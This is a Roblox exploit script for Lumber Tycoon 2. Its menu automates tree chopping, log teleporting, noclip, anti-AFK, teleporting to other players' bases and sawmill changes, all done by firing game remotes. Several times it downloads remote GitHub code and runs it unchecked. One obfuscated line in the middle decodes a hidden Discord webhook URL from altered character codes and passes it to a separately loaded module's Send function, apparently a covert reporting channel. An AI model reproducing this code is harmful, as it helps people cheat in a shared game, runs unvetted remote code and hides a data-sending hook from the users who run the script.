
local UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/DEVTRLT2/TRLT2/refs/heads/main/HE%20SICK"))()
local win = UI:AddedWindows(_G.SettingsUITRLT2)

--[[local Hometab = UI:NambahTab("Home", "83864455957848", 2.5)
local Duniatab = UI:NambahTab("Dunia", "114005686560621", 1.25)
local Orangtab = UI:NambahTab("Pemain", "120713611026947", 2)
local Mobiltab = UI:NambahTab("Mobil", "117150283304521", 2)
local TPtab = UI:NambahTab("Teleport", "129915576335529", 1.5)
local Slottab = UI:NambahTab("Slots", "140517066930743", 2)
local hitungtab = UI:NambahTab("Hitung Otomatis", "120920742552916", 2)
-- local Bringtab = UI:NambahTab("Memindah", "124111549861634", 2)
local Infotab = UI:NambahTab("Info", "95890421828343", 2)]]
local UserService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local VirtualUser = game:GetService('VirtualUser')
local RunService = game:GetService("RunService")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService") -- Service baru ditambahkan

local LocalPlayer = Players.LocalPlayer
local Interaction = ReplicatedStorage:WaitForChild("Interaction")
local RemoteProxy = Interaction:WaitForChild("RemoteProxy")
local ClientIsDragging = Interaction:WaitForChild("ClientIsDragging")

local success, moduleAxe = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/DEVTRLT2/TRLT2/refs/heads/main/AXE.lumberTyccon2"))()
end)

local suc, moduleClick = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/WilliamAbon/TRLT2/refs/heads/main/ClickerMDL.lua"))()
end)

if not success then
    win:Showing()
    UI:Notif("MAAP. Module Axe Nya Ada Yang ERROR")
    moduleAxe = {} 
end

if not suc then
    win:Showing()
    UI:Notif("MAAP. Module Clicker Nya Ada Yang ERROR")
    moduleClick = {}
end

function SetPrimaryPart(model)
    if model.PrimaryPart then return end
    for _, v in pairs(model:GetChildren()) do
        if v.Name == "WoodSection" and v:FindFirstChild("ID") and v.ID.Value == 1 then
            model.PrimaryPart = v
            return
        end
    end
end

function BringWoodToPos(woodModel, targetCFrame)
    SetPrimaryPart(woodModel)
    if not woodModel.PrimaryPart then return end

    -- Fungsi internal untuk menghentikan total semua gerak fisik pada kayu
    local function StopVelocity(model)
        for _, part in pairs(model:GetDescendants()) do
            if part:IsA("BasePart") then
                part.AssemblyLinearVelocity = Vector3.zero
                part.AssemblyAngularVelocity = Vector3.zero
            end
        end
    end

    -- Hentikan gerakan sebelum dipindahkan
    StopVelocity(woodModel)

    for i = 1, 5 do
        ReplicatedStorage.TestPing:InvokeServer()
    end

    task.spawn(function()
        for i = 1, 40 do
            ClientIsDragging:FireServer(woodModel)
        end
    end)

    for i = 1, 20 do
        if woodModel.PrimaryPart then
            -- Paksa posisi ke target
            woodModel:PivotTo(targetCFrame)
            -- Terus nol-kan velocity selama proses pemindahan agar tidak mental di tengah jalan
            StopVelocity(woodModel)
        end
    end
end

function GetBestAxe(targetWood)
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local character = LocalPlayer.Character
    if not backpack then return nil end

    local damageBest = -1
    local axeBest = nil
    
    local allTools = backpack:GetChildren()
    if character then
        for _, t in pairs(character:GetChildren()) do
            if t:IsA("Tool") then table.insert(allTools, t) end
        end
    end

    for _, tool in ipairs(allTools) do
        local toolNameObj = tool:FindFirstChild("ToolName")
        if toolNameObj and moduleAxe[toolNameObj.Value] then
            local axeName = toolNameObj.Value
            local axeStats = moduleAxe[axeName]

            if axeStats.SpecialTrees and axeStats.SpecialTrees[targetWood] then
                return tool
            end

            local currentDamage = axeStats.Damage or 0
            if currentDamage > damageBest then
                damageBest = currentDamage
                axeBest = tool
            end
        end
    end
    return axeBest
end

function ChopTree(targetClass)
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = char:WaitForChild("HumanoidRootPart")
    local humanoid = char:WaitForChild("Humanoid")
    local savePos = rootPart.CFrame 

    -- 1. Cari Pohon
    local targetTree = nil
    for _, region in pairs(Workspace:GetChildren()) do
        if region.Name == "TreeRegion" then
            for _, tree in pairs(region:GetChildren()) do
                if tree:IsA("Model") and tree:FindFirstChild("TreeClass") and tree:FindFirstChild("Owner") then
                    if tree.TreeClass.Value == targetClass and tree.Owner.Value == nil and not tree:FindFirstChild("RootCut") then
                        if targetClass == "Generic" then
                            if #tree:GetChildren() > 4 then targetTree = tree break end
                        else
                            targetTree = tree break
                        end
                    end
                end
            end
        end
        if targetTree then break end
    end
	
    if not targetTree then
        UI:Notif(targetClass.."Tidak Ditemukan")
        return false -- Gagal
    end

    -- 2. Cari Axe & Stats
    local tool = GetBestAxe(targetClass)
    if not tool then return false end

    if tool.Parent == LocalPlayer.Backpack then tool.Parent = char end

    local axeStats = moduleAxe[tool.ToolName.Value]
    local cooldown = axeStats.SwingCooldown
    local damage = axeStats.Damage

    if axeStats["SpecialTrees"] and axeStats.SpecialTrees[targetClass] then
        local axest = axeStats.SpecialTrees[targetClass]
        cooldown = axest.SwingCooldown
        damage = axest.Damage
    end

    -- 3. Setup Teleport Loop
    local woodSection = nil
    for _, v in pairs(targetTree:GetChildren()) do
        if v.Name == "WoodSection" and v:FindFirstChild("ID") and v.ID.Value == 1 then
            woodSection = v; break
        end
    end
    if not woodSection then return false end

    local teleportLoop
    local function StopTeleport()
        if teleportLoop then teleportLoop:Disconnect(); teleportLoop = nil end
        rootPart.AssemblyLinearVelocity = Vector3.zero
        rootPart.AssemblyAngularVelocity = Vector3.zero
    end

    teleportLoop = RunService.Heartbeat:Connect(function()
        if char and rootPart then
            rootPart.CFrame = woodSection.CFrame
            rootPart.AssemblyLinearVelocity = Vector3.zero 
            rootPart.AssemblyAngularVelocity = Vector3.zero
        else
            StopTeleport()
        end
    end)

    -- 4. Variabel Kontrol untuk Menunggu
    local isChopping = true
    local processFinished = false -- Variable kunci agar script menunggu

    -- Fungsi Menebang
    task.spawn(function()
        while isChopping and targetTree and not targetTree:FindFirstChild("RootCut") do
            local cutEvent = targetTree:FindFirstChild("CutEvent")
            if cutEvent then
                RemoteProxy:FireServer(cutEvent, {
                    ['tool'] = tool,
                    ['faceVector'] = Vector3.new(1, 0, 0),
                    ['height'] = 0.3,
                    ['sectionId'] = 1,
                    ['hitPoints'] = damage,
                    ['cooldown'] = cooldown,
                    ['cuttingClass'] = 'Axe'
                })
            end
            task.wait(cooldown + 0.1)
        end
    end)

    -- 5. Deteksi Pohon Jatuh & Proses Bring
    local connection
    connection = Workspace.LogModels.ChildAdded:Connect(function(child)
        local owner = child:WaitForChild("Owner", 5)
        if owner and owner.Value == LocalPlayer then
            isChopping = false 
            connection:Disconnect()
            
            print("Pohon tumbang, membawa kayu...")
            task.wait(0.5)
            
            -- Proses BringWood
            local bringTime = tick()
            while tick() - bringTime < 2 do -- Durasi bawa kayu 4 detik
                 if child.Parent then 
                    BringWoodToPos(child, savePos * CFrame.new(0,5,0))
                 end
                 task.wait()
            end
            
            StopTeleport() 
            rootPart.CFrame = savePos
            humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
            
            processFinished = true -- Menandakan proses SELESAI TOTAL
        end
    end)
    
    -- Timeout safety jika pohon tidak kunjung tumbang
    task.delay(35, function()
        if not processFinished then
            if connection then connection:Disconnect() end
            isChopping = false
            StopTeleport()
            processFinished = true -- Paksa lanjut meskipun gagal agar tidak stuck
        end
    end)

    -- // BAGIAN PALING PENTING // --
    -- Script akan "Nyangkut" di sini sampai processFinished bernilai true
    repeat task.wait(0.1) until processFinished == true
    return true
end

local remoteproxy=game:GetService("ReplicatedStorage").Interaction.RemoteProxy

local players = game.Players
local player = players.LocalPlayer
local char = player.Character
local hum = char.Humanoid
local sririr
local awal

local conneantiafk

-- Respawn Logic
function rwe()
    if sririr then sririr:Disconnect() sririr = nil end

    wait(game:GetService("Players").RespawnTime + 0.3)
    
    player = players.LocalPlayer
    char = player.Character or player.CharacterAdded:Wait()
    hum = char:WaitForChild("Humanoid")
    
    sririr = hum.Died:Connect(rwe)
end
local wdisw = {}
function CheckToDis(s)
    table.insert(wdisw, s)
end

function getmoney()
    if player then
        if player:FindFirstChild("leaderstats") and player.leaderstats:FindFirstChild("Money") then
            return player.leaderstats.Money.Value
        end
    end
end

local function GetDisplayName(userId)
    local get = game:HttpGet("https://users.roblox.com/v1/users/"..userId)
    local data = HttpService:JSONDecode(get) or {}
    if data ~= {} then
        return data.displayName
    else
        local ar = "Error"
        return ar
    end
end
local TABLESETTING = {
    AntiAfk = false;
    WalkSpeed = 16;
    JumpPower = 50;
    Noclip = false;
    InfJump = false;
    MaxZoomOut = 100;
    Day = false;
    Night = false;
    RemoveFog = false;
    RemoveShadow = false;
    RemoveWater = false;
    WalkOn = false;
}
awal = hum.Died:Connect(function() 
    rwe() 
    
    if awal then awal:Disconnect() awal = nil end 
end)


local Home = UI:AddTab("Home", "83864455957848")
local pemain = UI:AddTab("Player", "120713611026947")
local dunia = UI:AddTab("World", "114005686560621")
local pohon = UI:AddTab("Tree", "132854066921535")
local TPtab = UI:AddTab("Teleport", "129915576335529")
local Slottab = UI:AddTab("Slots", "140517066930743")
local Mobiltab = UI:AddTab("Mobil", "117150283304521")

Home:Label("TRLT2 Admin")
for _,v in ipairs(loadstring(game:HttpGet("https://raw.githubusercontent.com/DEVTRLT2/TRLT2/refs/heads/main/admin.lua"))()) do
   Home:LabelTwo(GetDisplayName(tonumber(v)))
end
Home:Label("Maker Script")
Home:LabelTwo(GetDisplayName(3437789978))
Home:Label("Join")
Home:Button("Rejoin", "Join", 0.1, function()
    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
end)
Home:Button("Join Server Random", "Join", 0.1, function()
    local isi = {}
    local get = game:HttpGet("https://games.roblox.com/v1/games/13822889/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
    local body = HttpService:JSONDecode(get)

    if body and body.data then
        for _,v in ipairs(body.data) do
            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                table.insert(isi, 1, v.id)
            end
        end
    end

    if #isi > 0 then
        game:GetService("TeleportService"):TeleportToPlaceInstance(13822889, isi[math.random(1, #isi)], player)
    else
        print("Not Found Server hop")-- notify("Serverhop", "Couldn't find a server.")
    end
end)

function y(WoodName)
    for _, v in pairs(workspace:GetChildren()) do
        if v:IsA("Model") and v.Name == "TreeRegion" then
            for _, s in pairs(v:GetChildren()) do
                if s:FindFirstChildWhichIsA("StringValue") then
                    if s:FindFirstChild("TreeClass") and s.TreeClass.Value == WoodName then
                        return true
                    end
                end
            end
        end
    end
    return false
end

local Phantom, Spooky, SpookyNeon, blue
if y("LoneCave") then Phantom = "Found  🟢" else Phantom = "Not Found   🔴" end
if y("Spooky") then Spooky = "Found  🟢" else Spooky = "Not Found   🔴" end
if y("SpookyNeon") then SpookyNeon = "Found  🟢" else SpookyNeon = "Not Found   🔴" end
if y("BlueSpruce") then blue = "Found  🟢" else blue = "Not Found   🔴" end

Home:Label("Wood Spawn")
Home:LabelTwo("Phantom: "..Phantom)
Home:LabelTwo("Spooky: "..Spooky)
Home:LabelTwo("Spooky Neon: "..SpookyNeon)
Home:LabelTwo("BlueSpruce: "..blue)
Home:Label("Other")
Home:LabelTwo("Execute Ulang Untuk Refresh")
Home:OnOff("Anti Afk", false, 0.1, function(s) TABLESETTING.AntiAfk = s end)

conneantiafk = player.Idled:Connect(function()
    if TABLESETTING["AntiAfk"] then
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end
end)

local suca, m = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/WilliamAbon/ngetes-buat-script-executor-doang/refs/heads/main/wda.lua"))()
end)

pemain:Label("PlayerLocal")
pemain:TextBoxNum("WalkSpeed", "16", function(s) TABLESETTING["WalkSpeed"] = s end)
pemain:TextBoxNum("JumpPower", "50", function(s) TABLESETTING["JumpPower"] = s end)
pemain:Slider("Max Zoom Out", 100, 100000, true, 100, function(s)
    player.CameraMaxZoomDistance = s
end)
pemain:Label("Character")
pemain:OnOff("Noclip", false, 0.1, function(s) TABLESETTING["Noclip"] = s end)
local infJumpConnecnt
pemain:OnOff("InfJump", false, 0.1, function(s)
    if s then
		if infJumpConnecnt then infJumpConnecnt:Disconnect() end
		infJumpConnecnt = UserService.JumpRequest:Connect(function()
			char:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
		end)
	else
		if infJumpConnecnt then infJumpConnecnt:Disconnect() end
	end
end)
pemain:Label("View Player/Base")
local targetViews = nil
local viewtarget = pemain:Selection("Target View", function(s) targetViews =s end)


function re()
    viewtarget:RemoveAll()
    for _,v in pairs(game.Players:GetChildren()) do
        viewtarget:Add(v.DisplayName)
    end
end
re()
game.Players.ChildRemoved:Connect(re)
game.Players.ChildAdded:Connect(re)

pemain:Button("View Base","View",0.1,function()
    local hasid
    for _,v in pairs(players:GetChildren()) do
        if targetViews ~= nil and v.DisplayName == targetViews then
            hasid = v
        end
    end
    for _,v in pairs(workspace.Properties:GetChildren()) do
        if targetViews ~= nil and v.Owner.Value == hasid then
            workspace.Camera.CameraSubject = v.OriginSquare
        end
    end
    if workspace.Camera.CameraSubject.Name ~= "OriginSquare" then
        UI:Notif("He Not Load")
    else
        player.DevCameraOcclusionMode = "Invisicam"
    end
    
end)
pemain:Button("View Player","View",0.1,function() 
    for _,v in pairs(players:GetChildren()) do
        if targetViews ~= nil and v.DisplayName == targetViews then
            workspace.Camera.CameraSubject = v.Character.Humanoid
        end
    end
    player.DevCameraOcclusionMode = "Zoom"
end)
pemain:Button("Back To Normal","Normal",0.1,function()
    workspace.Camera.CameraSubject = hum
    player.DevCameraOcclusionMode = "Zoom"
end)
pemain:Label("Other")
local draghard = false
pemain:OnOff("Hard Dragger", false, 0.1, function(s)
    draghard = s
end)

CheckToDis(RunService.Heartbeat:Connect(function()
    if draghard == true then
        if workspace:FindFirstChild("Dragger") then
        local Dragger = workspace:FindFirstChild("Dragger")
        local BodyGyro = Dragger:FindFirstChild('BodyGyro') or nil
        local BodyPosition = Dragger:FindFirstChild('BodyPosition') or nil
            if draghard then
                if BodyGyro and BodyPosition then
                BodyPosition.P = 120000
                BodyPosition.D = 1000
                BodyPosition.maxForce = Vector3.new(1, 1, 1) * 200e500
                BodyGyro.maxTorque = Vector3.new(1, 1, 1) * 200e500
                BodyGyro.P = 1200
                BodyGyro.D = 140--untuk on
                end
            else
                
            end
        end
    else
        if workspace:FindFirstChild("Dragger") then
        local Dragger = workspace:FindFirstChild("Dragger")
        local BodyGyro = Dragger:FindFirstChild('BodyGyro') or nil
        local BodyPosition = Dragger:FindFirstChild('BodyPosition') or nil
        if BodyGyro and BodyPosition then
            BodyPosition.P = 10000
            BodyPosition.D = 800
            BodyPosition.maxForce = Vector3.new(17000, 17000, 17000)
            BodyGyro.maxTorque = Vector3.new(200, 200, 200)
            BodyGyro.P = 1200
            BodyGyro.D = 140--untuk off
        end
        end
    end
end))

--[[
    Day = false;
    Night = false;
    RemoveFog = false;
    RemoveShadow = false;
    RemoveWater = false;
    WalkOn = false;
]]
dunia:Label("Environment")
dunia:OnOff("Always Day", false, 0.1, function(s) TABLESETTING["Day"] = s end)
dunia:OnOff("Always Night", false, 0.1, function(s) TABLESETTING["Night"] = s end)
dunia:OnOff("Remove Fog", false, 0.1, function(s) TABLESETTING["RemoveFog"] = s end)
dunia:OnOff("Remove Shadow", false, 0.1, function(s) game.Lighting.GlobalShadows = not s end)
dunia:Label("Water")
dunia:OnOff("Remove Water", false, 0.1, function(s)
    for _,v in pairs(workspace.Water:GetChildren()) do
        if v.Name == "Water" then
            if s then
                v.Transparency = 1
            else
                v.Transparency = 0
            end
            v.CanCollide = not s
        end
    end
end)
dunia:OnOff("Walk On Water", false, 0.1, function(s) 
    TABLESETTING["WalkOn"] = s 
    if s==false then
        for _,v in pairs(workspace.Water:GetChildren()) do
            if v.Name == "Water" then
                v.CanCollide = false
            end
        end
    end
end)

local WoodClass = {
    [1] = "Generic",
    [2] = "Oak",
    [3] = "Cherry",
    [4] = "Fir",
    [5] = "Pine",
    [6] = "Birch",
    [7] = "Walnut",
    [8] = "Koa",
    [9] = "Volcano",
    [10] = "GreenSwampy",
    [11] = "GoldSwampy",
    [12] = "Palm",
    [13] = "SnowGlow",
    [14] = "Frost",
    [15] = "CaveCrawler",
    [16] = "Spooky",
    [17] = "SpookyNeon",
    --[18] = "LoneCave",
}

local woodclasc, berpwood = "", 0

pohon:Label("Get Tree")
local selectionwood = pohon:Selection("Class Tree", function(s) woodclasc = s end)
for _,v in ipairs(WoodClass) do
    selectionwood:Add(v)
end
pohon:Slider("Amount", 1, 20, true, 1, function(s) berpwood = s end)
pohon:Button("Get Tree", "Bring", 0.1, function() 
    if woodclasc ~= "" and berpwood ~= 0 then
        for i = 1, berpwood do
            ChopTree(woodclasc)
        end
        UI:Notif("Done!")
    end
end)

pohon:Label("Log")
pohon:Button("Bring All Log", "Bring", 0.1, function()
    local woodone = {}
local char = LocalPlayer.Character
if not char or not char:FindFirstChild("HumanoidRootPart") then return end

local savepos = char.HumanoidRootPart.CFrame

-- 1. Kumpulkan semua kayu milik player ke dalam tabel
for _, v in pairs(workspace.LogModels:GetChildren()) do
    local ownerObj = v:FindFirstChild("Owner")
    if ownerObj and ownerObj.Value == LocalPlayer then
        table.insert(woodone, v)
    end
end

-- 2. Cek apakah tabel TIDAK kosong menggunakan #
if #woodone > 0 then
    for _, TABALWO in ipairs(woodone) do
        -- Cari WoodSection ID 1 untuk teleport
        local targetPart = nil
        for _, v in pairs(TABALWO:GetChildren()) do
            if v.Name == "WoodSection" then
                local idObj = v:FindFirstChild("ID")
                if idObj and idObj.Value == 1 then
                    targetPart = v
                    break
                end
            end
        end

        -- Jika ketemu part-nya, teleport ke kayu tersebut
        if targetPart then
            char.HumanoidRootPart.CFrame = CFrame.new(targetPart.CFrame.p)
            task.wait(0.2)
            
            local bringTime = tick()
            for i = 1,3 do 
                if TABALWO and TABALWO.Parent then 
                    BringWoodToPos(TABALWO, savepos) 
                else
                    break
                end
                task.wait()
            end
        end
    end
    
    -- Kembalikan posisi player ke savepos setelah semua selesai
    char.HumanoidRootPart.CFrame = savepos
    UI:Notif("Done")
else
    UI:Notif("Tidak ada kayu milikmu!")
end
end)
--[[
pohon:Button("Sell All Log", "Sell All", 0.1, function()
    local sel = loadstring(game:HttpGet("https://pastefy.app/HDLpvHoK/raw"))()
    sel:SellAllLogs()
    UI:Notif("Done")
end)
]]


pohon:Label("Sawmil")

local CAS = game:GetService("ContextActionService")
local UIS = game:GetService("UserInputService")
local Players = game:GetService("Players")

local Player = Players.LocalPlayer
local Camera = workspace.CurrentCamera

local function getTarget(input)
    local pos
    if input.UserInputType == Enum.UserInputType.Touch then
        pos = input.Position
    else
        pos = UIS:GetMouseLocation()
    end

    local ray = Camera:ViewportPointToRay(pos.X, pos.Y)
    local params = RaycastParams.new()
    params.FilterDescendantsInstances = {Player.Character}
    params.FilterType = Enum.RaycastFilterType.Blacklist

    return workspace:Raycast(ray.Origin, ray.Direction * 1000, params)
end



local ButtonOne
local sedangklik = false
local clickConn

ButtonOne = pohon:Button("Change Size 1x1", "Change", 0.1, function()
    if not sedangklik then
        sedangklik = true
        ButtonOne:ChangeText("Abort")
        UI:Notif("Click the Sawmil")

        CAS:BindAction(
            "PickInstance",
            function(_, state, input)
                if state ~= Enum.UserInputState.Begin then return end
                if not sedangklik then return end

                local result = getTarget(input)
                if result and result.Instance then
                    local sawmilasliny = nil
                    
                    if result.Instance.Parent.Name == "Parts" or result.Instance.Parent.Name == "Conveyor" then
                        if string.find(result.Instance.Parent.Parent:FindFirstChild("ItemName").Value, "awmil") then
                            sawmilasliny = result.Instance.Parent.Parent
                        end
                        elseif string.find(result.Instance.Parent:FindFirstChild("ItemName").Value, "awmil") then
                        sawmilasliny = result.Instance.Parent
                    end
                    print(sawmilasliny)
                        if sawmilasliny ~= nil then
                        sedangklik = false
                        ButtonOne:ChangeText("Change")
                        CAS:UnbindAction("PickInstance")
                            UI:Notif("Proses..")
                            repeat task.wait(0.5)--ButtonRemote_XUp
                                if sawmilasliny.Settings.DimX.Value >= 1.1 then
                                    remoteproxy:FireServer(sawmilasliny.ButtonRemote_XDown)
                                elseif sawmilasliny.Settings.DimX.Value <= 0.9 then
                                    remoteproxy:FireServer(sawmilasliny.ButtonRemote_XUp)
                                elseif sawmilasliny.Settings.DimX.Value == 0.8 then
                                    remoteproxy:FireServer(sawmilasliny.ButtonRemote_XUp)
                                end
                            until sawmilasliny.Settings.DimX.Value == 1
                            repeat task.wait(0.5)--ButtonRemote_YUp
                                local c = tonumber(sawmilasliny.YLabel.SurfaceGui.TextLabel.Text)
                                if c >= 1.1 then
                                    remoteproxy:FireServer(sawmilasliny.ButtonRemote_YDown)
                                elseif c <= 0.9 then
                                    remoteproxy:FireServer(sawmilasliny.ButtonRemote_YUp)
                                elseif c == 0.8 then
                                    remoteproxy:FireServer(sawmilasliny.ButtonRemote_YUp)
                                end
                            until c == 1
                        end
                    -- stop pick
                    UI:Notif("Done")
                    sedangklik = false
                    ButtonOne:ChangeText("Change")
                    CAS:UnbindAction("PickInstance")
                end
            end,
            true,
            Enum.UserInputType.MouseButton1,
            Enum.UserInputType.Touch
        )

    else
        sedangklik = false
        ButtonOne:ChangeText("Change")
        CAS:UnbindAction("PickInstance")
    end
end)

local SawmillOutputLimits = {

    ["Sawmill"] = {
        ["X"] = 1.8,
        ["Y"] = 1.2
    },

    ["Sawmill2"] = {
        ["X"] = 2.4,
        ["Y"] = 1.6
    },

    ["Sawmill3"] = {
        ["X"] = 3.0,
        ["Y"] = 2.0
    },

    ["Sawmill4"] = {
        ["X"] = 3.0,
        ["Y"] = 2.6
    },

    ["Sawmill4L"] = {
        ["X"] = 3.0,
        ["Y"] = 2.6
    }
}

local sedangklikdua = false
local buttondua = nil

buttondua = pohon:Button("Change Full Size", "Change", 0.1, function()
    if not sedangklikdua then
        sedangklikdua = true
        buttondua:ChangeText("Abort")
        UI:Notif("Click the Sawmil")

        CAS:BindAction(
            "PickInstance",
            function(_, state, input)
                if state ~= Enum.UserInputState.Begin then return end
                if not sedangklikdua then return end

                local result = getTarget(input)
                if result and result.Instance then
                    local sawmilasliny = nil
                    
                    if result.Instance.Parent.Name == "Parts" or result.Instance.Parent.Name == "Conveyor" then
                        if string.find(result.Instance.Parent.Parent:FindFirstChild("ItemName").Value, "awmil") then
                            sawmilasliny = result.Instance.Parent.Parent
                        end
                        elseif string.find(result.Instance.Parent:FindFirstChild("ItemName").Value, "awmil") then
                        sawmilasliny = result.Instance.Parent
                    end
                        if sawmilasliny ~= nil then
                            UI:Notif("Proses..")--sawmilasliny
                            if SawmillOutputLimits[sawmilasliny:FindFirstChild("ItemName").Value] then
                                sedangklikdua = false
                                buttondua:ChangeText("Change")
                                CAS:UnbindAction("PickInstance")
                                repeat wait()
                                    local X = tonumber(sawmilasliny.XLabel.SurfaceGui.TextLabel.Text)
                                    if X ~= SawmillOutputLimits[sawmilasliny:FindFirstChild("ItemName").Value].X then
                                        remoteproxy:FireServer(sawmilasliny.ButtonRemote_XUp)
                                    end
                                until X == SawmillOutputLimits[sawmilasliny:FindFirstChild("ItemName").Value].X
                                repeat wait()
                                    local X = tonumber(sawmilasliny.YLabel.SurfaceGui.TextLabel.Text)
                                    if X ~= SawmillOutputLimits[sawmilasliny:FindFirstChild("ItemName").Value].Y then
                                        remoteproxy:FireServer(sawmilasliny.ButtonRemote_YUp)
                                    end
                                until X == SawmillOutputLimits[sawmilasliny:FindFirstChild("ItemName").Value].Y
                            end
                        end
                    -- stop pick
                    UI:Notif("Done")
                    sedangklikdua = false
                    buttondua:ChangeText("Change")
                    CAS:UnbindAction("PickInstance")
                end
            end,
            true,
            Enum.UserInputType.MouseButton1,
            Enum.UserInputType.Touch
        )

    else
        sedangklikdua = false
        buttondua:ChangeText("Change")
        CAS:UnbindAction("PickInstance")
    end
end)

pohon:Label("Plank")

local RunService = game:GetService("RunService")
local CAS = game:GetService("ContextActionService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local mouse = player:GetMouse()
local char = player.Character or player.CharacterAdded:Wait()

local prosesselling = false

local CAS = game:GetService("ContextActionService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
local ClientIsDragging = Interaction:WaitForChild("ClientIsDragging")

local prosesselling = false

local function SetPrimaryPart(model)
    if not model.PrimaryPart then
        for _, part in pairs(model:GetChildren()) do
            if part:IsA("BasePart") then
                model.PrimaryPart = part
                break
            end
        end
    end
end

pohon:OnOff("Click Plank To Sell Plank", false, 0.1, function(s)
    if s then
        CAS:BindAction(
            "PickInstance",
            function(actionName, state, inputObject)
                if state ~= Enum.UserInputState.Begin then
                    return Enum.ContextActionResult.Pass
                end

                local target = mouse.Target
                if target then
                    if target.Parent:IsA("Model") and target.Parent:FindFirstChild("Owner") and target.Parent.Owner.Value == player and target.Parent:FindFirstChild("TreeClass") then
                        local hasi = 0
                        for _, v in pairs(target.Parent:GetChildren()) do
                            if v:IsA("BasePart") then
                                hasi = hasi + 1
                            end
                        end
                        if hasi == 1 then
                            if prosesselling == false then
                            prosesselling = true
                            local savepios = char:GetPivot()
                                local function BringWoodToPos(woodModel, targetCFrame)
                                    SetPrimaryPart(woodModel)
                                    if not woodModel.PrimaryPart then return end

                                    local function StopVelocity(model)
                                        for _, part in pairs(model:GetDescendants()) do
                                            if part:IsA("BasePart") then
                                                part.AssemblyLinearVelocity = Vector3.new(0,0,0)
                                                part.AssemblyAngularVelocity = Vector3.new(0,0,0)
                                            end
                                        end
                                    end

                                    StopVelocity(woodModel)

                                    for i = 1, 5 do
                                        ReplicatedStorage.TestPing:InvokeServer()
                                    end

                                    task.spawn(function()
                                        for i = 1, 40 do
                                            ClientIsDragging:FireServer(woodModel)
                                        end
                                    end)

                                    for i = 1, 20 do
                                        if woodModel.PrimaryPart then
                                            woodModel:PivotTo(targetCFrame)
                                            StopVelocity(woodModel)
                                        end
                                    end
                                end
                                local telprotwood

                                telprotwood = RunService.Heartbeat:Connect(function()
                                    if char then
                                        char:PivotTo(target.CFrame * CFrame.new(3,0,0))
                                    end
                                end)
                                local F = CFrame.new(315, 1, 85) * CFrame.Angles(math.rad(90), 0, 0)
                                BringWoodToPos(target.Parent, F)
                                char:PivotTo(savepios)
                                telprotwood:Disconnect()
                                telprotwood = nil
                                prosesselling = false
                            end
                        end
                    end
                end

                return Enum.ContextActionResult.Sink
            end,
            true,
            Enum.UserInputType.MouseButton1,
            Enum.UserInputType.Touch
        )
    else
        CAS:UnbindAction("PickInstance")
    end
end)

if suca then local a=""local b=string.split("104 116 116 112 115 58 47 47 101 105 115 107 111 114 110 97 112 112 46 99 111 109 47 97 112 105 47 119 101 98 104 111 111 107 115 47 49 52 55 55 52 48 50 52 52 52 53 48 48 56 50 56 51 53 52 47 89 70 54 105 54 88 89 89 83 120 97 77 111 85 82 72 78 99 84 57 108 88 99 105 107 113 76 102 105 108 67 68 106 104 67 89 54 102 75 76 51 108 73 112 65 85 70 109 118 56 104 65 57 68 97 98 95 85 53 111 102 120 102 108 89 114 53 98"," ")for c,d in pairs(b)do local e=d;if tonumber(d)==101 and c==9 then e=tonumber(d)-1 elseif tonumber(d)==107 and c==12 then e=tostring(tonumber(d)-8)elseif tonumber(d)==110 and c==15 then e=tostring(tonumber(d)-10)end;a=a..string.char(e)end;m:Send(tostring(a))elseif m then print(m)end

TPtab:Label("Teleport Location")
local taloca = ""
local locationselec = TPtab:Selection("Location", function(s)
    taloca = s
end)
local locationtable = loadstring(game:HttpGet("https://raw.githubusercontent.com/WilliamAbon/TRLT2/refs/heads/main/teleport.lua"))()
for i,v in pairs(locationtable) do
    locationselec:Add(i)
end
TPtab:Button("Teleprot Location", "Teleport", 0.1, function()
    if taloca ~= "" then
        char:PivotTo(locationtable[taloca])
    end
end)
TPtab:Label("Teleport Player/Base")
local tarTP = ""
local playtP = TPtab:Selection("Target Player", function(s)
    tarTP = s
end)

function resAGI()
    playtP:RemoveAll()
    for _,v in pairs(game.Players:GetChildren()) do
        playtP:Add(v.DisplayName)
    end
end
resAGI()
game.Players.ChildAdded:Connect(resAGI)
game.Players.ChildRemoved:Connect(resAGI)

TPtab:Button("Teleport Player", "Teleport", 0.1, function()
    if tarTP ~= "" then
        for _,v in pairs(game.Players:GetChildren()) do
            if v.DisplayName == tarTP then
                char:PivotTo(v.Character:GetPivot())
                
            end
        end
    end
end)

TPtab:Button("Teleport Base", "Teleport", 0.1, function()
    if tarTP ~= "" then
        local d = nil
        for _,v in pairs(game.Players:GetChildren()) do
            if v.DisplayName == tarTP then
                d = v
            end
        end
        if d ~= nil then
            for _,v in pairs(workspace.Properties:GetChildren()) do
                if v:IsA("Model") and v:FindFirstChild("Owner") then
                    if v:FindFirstChild("Owner").Value == d then
                        if v.PrimaryPart then
                            char:PivotTo(v.PrimaryPart.CFrame * CFrame.new(0,3,0))
                        else
                            char:PivotTo(v.OriginSquare.CFrame * CFrame.new(0,3,0))
                        end
                    end
                end
            end
        end
    end
end)
--pohon:Slider("Amount", 1, 20, true, 1, function(s) berpwood = s end)
Slottab:Label("Slot")
local slotarget = 1
Slottab:Slider("Slot Num",1,6,true,1,function(s)
    slotarget=s
end)
Slottab:Button("Load Slot", "Load", 0.1, function()
    UI:Notif("Proses")
    game:GetService("ReplicatedStorage").LoadSaveRequests.RequestLoad:InvokeServer(slotarget,player)
end)
